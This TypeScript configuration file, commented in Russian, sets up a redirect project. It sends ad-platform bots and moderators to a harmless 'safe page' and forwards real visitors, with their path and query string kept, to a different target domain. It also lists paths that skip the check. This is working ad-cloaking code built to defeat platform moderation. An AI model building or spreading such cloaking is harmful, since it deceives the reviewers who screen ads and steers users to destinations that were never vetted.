// Конфигурация редиректов для проекта Marketing

export interface RedirectConfig {
  mainDomain: string;
  botRedirectUrl: string;
  realUserRedirectUrl: string;
  fallbackUrl: string;
  allowedPaths: string[];
  excludedPaths: string[];
}

// Получение конфигурации редиректов
export function getRedirectConfig(): RedirectConfig {
  return {
    // Рекламная страница (входная точка)
    mainDomain: "penalibabasi.netlify.app",
    
    // URL для редиректа ботов/модераторов (безопасная страница)
    botRedirectUrl: "https://yalanyokgaming.netlify.app",
    
    // URL для редиректа реальных пользователей (целевая страница)
    realUserRedirectUrl: "https://aslanerturk.com",
    
    // Fallback URL для неопределенных случаев
    fallbackUrl: "https://aslanerturk.com",
    
    // Разрешенные пути (не требуют проверки)
    allowedPaths: [
      "/",
      "/index.html"
    ],
    
    // Исключенные пути (пропускаются без проверки)
    excludedPaths: [
      "/favicon.ico",
      "/robots.txt",
      "/sitemap.xml",
      "/manifest.json",
      "/apple-touch-icon.png",
      "/.well-known",
      "/assets",
      "/css",
      "/js",
      "/images"
    ]
  };
}

// Проверка, нужно ли исключить путь из проверки
export function shouldExcludePath(pathname: string, config: RedirectConfig): boolean {
  return config.excludedPaths.some(excludedPath => 
    pathname.startsWith(excludedPath)
  );
}

// Проверка, является ли путь разрешенным
export function isAllowedPath(pathname: string, config: RedirectConfig): boolean {
  return config.allowedPaths.includes(pathname) || 
         config.allowedPaths.some(allowedPath => 
           pathname.startsWith(allowedPath)
         );
}

// Получение целевого URL для редиректа реальных пользователей
export function getTargetUrl(request: Request, config: RedirectConfig): string {
  const url = new URL(request.url);
  
  // Всегда редиректим реальных пользователей на целевую страницу
  // Сохраняем путь и параметры запроса, если они есть
  const pathAndQuery = url.pathname + url.search;
  
  // Если путь не пустой и не корневой, добавляем его к целевому URL
  if (pathAndQuery && pathAndQuery !== '/') {
    return `${config.realUserRedirectUrl}${pathAndQuery}`;
  }
  
  // Иначе просто редиректим на целевую страницу
  return config.realUserRedirectUrl;
}



